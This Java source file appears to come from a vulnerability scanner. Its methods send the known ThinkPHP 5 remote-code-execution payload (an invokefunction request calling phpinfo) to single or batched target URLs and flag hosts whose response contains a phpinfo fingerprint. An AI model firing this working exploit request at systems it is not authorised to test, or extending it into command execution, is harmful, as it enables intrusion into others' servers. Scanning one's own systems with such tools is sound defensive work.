package com.tools.automation.support;

import okhttp3.*;
import org.jetbrains.annotations.NotNull;

import java.io.IOException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.concurrent.CountDownLatch;

/**
 * 通用漏洞扫描类，里面包含不同通用漏洞的poc方法
 */
public class UniversalScan
{
    /**
     * 采用异步方式针对单个目标验证是否存在ThinkPHP5远程代码执行漏洞，将结果以键值对方式存入传入成员变量HashMap中。
     * @param okHttpClient
     * @param targetUrl
     * @return
     */
    public void thinkPHP_RCE(
            OkHttpClient okHttpClient,
            String targetUrl,
            HashMap<String,Boolean> resultHashMap,
            Method method,
            CountDownLatch latch
    )
    {
        String payload="/index.php?s=index%2f\\think\\app%2finvokefunction&function=phpinfo&vars[0]=100";
        String finger="arg_separator.output";
        String fullUrl=targetUrl+payload;
        Request request=new Request.Builder()
                .url(fullUrl)
                .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36")
                .build();

        //传入的OkHttpClient是信任所有证书的，并且设置好连接超时、读写超时
        okHttpClient.newCall(request).enqueue(new Callback()
        {
            @Override
            public void onFailure(@NotNull Call call, @NotNull IOException e)
            {
                System.out.println(targetUrl+"测试"+method.getName()+"漏洞时，连接异常！");
                latch.countDown();
            }

            @Override
            public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException
            {
                //根据指纹判断是否有phpinfo页面，来确定是否有漏洞
                if (response.body().string().indexOf(finger)!=-1)
                {
                    resultHashMap.replace(method.getName(),true);
                    System.out.println(targetUrl+"存在"+method.getName()+"漏洞");
                    latch.countDown();
                }
                else
                {
                    System.out.println(targetUrl+"不存在"+method.getName()+"漏洞");
                    latch.countDown();
                }
            }
        });


    }

    /**
     * 对传入的目标数组利用OkHttp进行批量检测，返回键值组。
     * @param okHttpClient
     * @param targetUrls
     * @return
     */
    public HashMap<String,Boolean> thinkPHP_RCE(OkHttpClient okHttpClient, ArrayList<String> targetUrls)
    {
        String payload="/index.php?s=index%2f\\think\\app%2finvokefunction&function=phpinfo&vars[0]=100";
        String finger="arg_separator.output";
        HashMap<String,Boolean> hashMap=new HashMap<String,Boolean>();
        for(String targetUrl:targetUrls)
        {
            String fullUrl=targetUrl+payload;
            Request request=new Request.Builder()
                    .url(fullUrl)
                    .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36")
                    .build();
            okHttpClient.newCall(request).enqueue(new Callback()
            {
                @Override
                public void onFailure(@NotNull Call call, @NotNull IOException e)
                {
                    hashMap.put(fullUrl,false);
                }

                @Override
                public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException
                {
                    if(!response.isSuccessful())
                    {
                        throw new IOException("Unexpected code"+response);
                    }
                    if(response.body().string().indexOf(finger)!=-1)
                    {
                        hashMap.put(fullUrl,true);
                    }
                    else
                    {
                        hashMap.put(fullUrl,false);
                    }
                }
            });
        }
        return hashMap;
    }

    /**
     * 用于测试反射能否正常执行
     * @param okHttpClient
     * @param str
     */
    public void testPrint(
            OkHttpClient okHttpClient,
            String str,
            HashMap<String,Boolean> resultHashMap,
            Method method,
            CountDownLatch latch)
    {
        try
        {
            Thread.currentThread().sleep(20);
        }
        catch (InterruptedException e)
        {
            e.printStackTrace();
        }
        resultHashMap.replace(method.getName(),true);  //测试能否加载多个插件，并且将正确的值赋值给成员
        System.out.println("测试反射调用方法打印成功！"+str);
        latch.countDown();
    }
}
